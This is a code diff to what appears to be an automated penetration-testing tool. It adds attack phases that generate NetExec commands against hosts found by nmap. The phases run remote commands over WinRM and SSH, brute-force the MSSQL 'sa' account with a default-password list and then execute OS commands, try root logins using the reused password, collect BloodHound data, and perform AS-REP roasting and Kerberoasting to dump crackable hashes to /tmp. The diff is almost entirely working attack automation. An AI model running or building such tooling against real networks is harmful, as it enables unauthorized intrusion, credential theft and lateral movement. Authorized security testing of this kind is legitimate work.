@@ -128,6 +128,20 @@ class NetExecTool(BaseTool):
             "keepass_trigger", # Export KeePass database using trigger mechanism
         ]
 
+        # ── Pull per-protocol host lists from nmap feed ──────────────
+        winrm_hosts  = self.feed.get("winrm_hosts", [])
+        mssql_hosts  = self.feed.get("mssql_hosts", [])
+        rdp_hosts    = self.feed.get("rdp_hosts", [])
+        ssh_hosts    = self.feed.get("ssh_hosts", [])
+        dc_hosts     = self.feed.get("dc_hosts", [])
+
+        def _hostfile(hosts: list, prefix: str) -> str:
+            """Write a list of hosts to a temp file and return its path."""
+            import tempfile as _tf
+            f = Path(_tf.mktemp(prefix=f"crushgear_nxc_{prefix}_", suffix=".txt"))
+            f.write_text("\n".join(hosts) + "\n")
+            return str(f)
+
         # ─────────────────────────────────────────────────────────────
         # Build the complete bash script
         # ─────────────────────────────────────────────────────────────
@@ -154,5 +168,70 @@ class NetExecTool(BaseTool):
             ]
             for mod in postauth_modules:
                 parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")
+
+        # ── Phase F: WinRM (port 5985/5986) — PowerShell Remoting ────
+        # WinRM enables remote cmd/PowerShell execution; if creds work
+        # this yields an immediate interactive shell.
+        if winrm_hosts:
+            wf = _hostfile(winrm_hosts, "winrm")
+            parts.append("echo ''; echo '=== NetExec: Phase F — WinRM (PowerShell Remoting) ==='")
+            parts.append(f"{nxc} winrm {wf} {cred} 2>&1")
+            if has_creds:
+                parts.append(
+                    f"{nxc} winrm {wf} {cred} -x 'whoami /all; hostname; ipconfig /all' 2>&1"
+                )
+
+        # ── Phase G: MSSQL (port 1433) ───────────────────────────────
+        # Test SA and common default passwords; if auth succeeds,
+        # xp_cmdshell delivers OS-level command execution.
+        if mssql_hosts:
+            mf = _hostfile(mssql_hosts, "mssql")
+            parts.append("echo ''; echo '=== NetExec: Phase G — MSSQL ==='")
+            for sa_pass in ("", "sa", "password", "Password1", "admin", "123456"):
+                parts.append(f"{nxc} mssql {mf} -u 'sa' -p '{sa_pass}' 2>&1")
+            if has_creds:
+                parts.append(
+                    f"{nxc} mssql {mf} {cred} -q 'SELECT @@version, SYSTEM_USER, DB_NAME()' 2>&1"
+                )
+                parts.append(f"{nxc} mssql {mf} {cred} --local-auth 2>&1")
+                parts.append(f"{nxc} mssql {mf} {cred} -x 'whoami' 2>&1")
+
+        # ── Phase H: SSH (port 22) ────────────────────────────────────
+        # Banner grab + credential validation; also tries root with same
+        # password (very common misconfiguration on Linux targets).
+        if ssh_hosts:
+            sf = _hostfile(ssh_hosts, "ssh")
+            parts.append("echo ''; echo '=== NetExec: Phase H — SSH ==='")
+            parts.append(f"{nxc} ssh {sf} 2>&1")
+            if has_creds:
+                parts.append(f"{nxc} ssh {sf} {cred} -x 'id; uname -a; whoami' 2>&1")
+                parts.append(
+                    f"{nxc} ssh {sf} -u 'root' -p '{self.password}' -x 'id' 2>&1"
+                )
+
+        # ── Phase I: RDP (port 3389) ──────────────────────────────────
+        # Fingerprint NLA/security layer and validate credentials.
+        if rdp_hosts:
+            rf = _hostfile(rdp_hosts, "rdp")
+            parts.append("echo ''; echo '=== NetExec: Phase I — RDP ==='")
+            parts.append(f"{nxc} rdp {rf} 2>&1")
+            if has_creds:
+                parts.append(f"{nxc} rdp {rf} {cred} 2>&1")
+
+        # ── Phase J: DC Deep Enumeration (BloodHound + Kerberos) ─────
+        # Full BloodHound collection + AS-REP / Kerberoasting when DCs
+        # are identified from nmap (Kerberos port 88 + LDAP 389/636).
+        if dc_hosts:
+            dcf = _hostfile(dc_hosts, "dc")
+            parts.append(
+                "echo ''; echo '=== NetExec: Phase J — Domain Controller (BloodHound + Kerberos Attacks) ==='"
+            )
+            parts.append(f"{nxc} ldap {dcf} {cred} --bloodhound -c All 2>&1")
+            parts.append(
+                f"{nxc} ldap {dcf} {cred} --asreproast /tmp/crushgear_asrep.txt 2>&1"
+            )
+            parts.append(
+                f"{nxc} ldap {dcf} {cred} --kerberoasting /tmp/crushgear_kerbroast.txt 2>&1"
+            )
 
         return ["bash", "-c", "; ".join(parts)]
